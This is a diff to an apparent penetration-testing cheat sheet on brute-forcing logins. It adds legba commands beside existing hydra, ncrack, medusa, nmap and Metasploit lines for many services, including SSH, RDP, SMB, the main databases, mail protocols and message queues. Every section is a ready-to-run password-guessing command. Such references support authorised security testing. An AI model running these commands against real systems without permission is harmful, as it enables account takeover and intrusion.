@@ -136,10 +136,18 @@ msf> run
 nmap --script ajp-brute -p 8009 <IP>
 ```
 
+## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
+
+```bash
+legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
+```
+
 ### Cassandra
 
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
+# legba ScyllaDB / Apache Casandra
+legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
 ```
 
 ### CouchDB
@@ -167,6 +175,7 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
+legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
 
 ### HTTP Generic Brute
@@ -179,6 +188,14 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
 medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
+legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
+```
+
+### HTTP - NTLM
+
+```bash
+legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
 
 ### HTTP - Post Form
@@ -194,6 +211,7 @@ For http**s** you have to change from "http-post-form" to "**https-post-form"**
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
+# Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 
 ### IMAP
@@ -202,6 +220,7 @@ cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
 nmap -sV --script imap-brute -p <PORT> <IP>
+legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 
 ### IRC
@@ -245,12 +264,14 @@ jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibm
 
 ```bash
 nmap --script ldap-brute -p 389 <IP>
+legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
 
 ### MQTT
 
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
+legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt 
 ```
 
 ### Mongo
@@ -258,6 +279,13 @@ ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
+legba mongodb --target localhost:27017 --username root --password data/passwords.txt
+```
+
+### MSSQL
+
+```bash
+legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
 
 ### MySQL
@@ -271,6 +299,9 @@ msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
 
 # medusa
 medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
+
+#Legba
+legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
 ```
 
 ### OracleSQL
@@ -295,6 +326,8 @@ msf> set SID <SID>
 
 #for some reason nmap fails sometimes when executing this script
 nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
+
+legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
 
 In order to use **oracle\_login** with **patator** you need to **install**:
@@ -314,6 +347,12 @@ pip3 install cx_Oracle --upgrade
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
+
+# Insecure
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110
+
+# SSL
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 
 ### PostgreSQL
@@ -325,6 +364,7 @@ ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
 patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
 use auxiliary/scanner/postgres/postgres_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
 ```
 
 ### PPTP
@@ -341,6 +381,7 @@ cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
 
 ### Redis
@@ -349,6 +390,7 @@ hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
 hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
+legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
 ```
 
 ### Rexec
@@ -383,6 +425,14 @@ nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/va
 hydra -l root -P passwords.txt <IP> rtsp
 ```
 
+### SFTP
+
+```bash
+legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+```
+
 ### SNMP
 
 ```bash
@@ -397,6 +447,7 @@ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ta
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
 
 ### SMTP
@@ -404,26 +455,17 @@ hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
+legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
 ```
 
 ### SOCKS
 
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
+# With alternative address
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-
-### SSH
-
-```bash
-hydra -l root -P passwords.txt [-t 32] <IP> ssh
-ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
-patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
-```
-
-#### Weak SSH keys / Debian predictable PRNG
-
-Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pre-generated sets of weak keys are also available such as [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### SQL Server
 
@@ -436,12 +478,45 @@ nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=cust
 msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
 ```
 
+### SSH
+
+```bash
+hydra -l root -P passwords.txt [-t 32] <IP> ssh
+ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
+patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
+legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+```
+
+#### Weak SSH keys / Debian predictable PRNG
+
+Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pre-generated sets of weak keys are also available such as [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
+
+The STOMP text protocol allows interaction with message queueing services like ActiveMQ, RabbitMQ, HornetQ and OpenMQ.
+
+```bash
+legba stomp --target localhost:61613 --username admin --password data/passwords.txt
+```
+
 ### Telnet
 
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
+
+legba telnet \
+    --username admin \
+    --password wordlists/passwords.txt \
+    --target localhost:23 \
+    --telnet-user-prompt "login: " \
+    --telnet-pass-prompt "Password: " \
+    --telnet-prompt ":~$ " \
+    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
 ```
 
 ### VNC
@@ -453,6 +528,7 @@ ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
 patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
 use auxiliary/scanner/vnc/vnc_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+legba vnc --target localhost:5901 --password data/passwords.txt
 
 #Metasploit
 use auxiliary/scanner/vnc/vnc_login
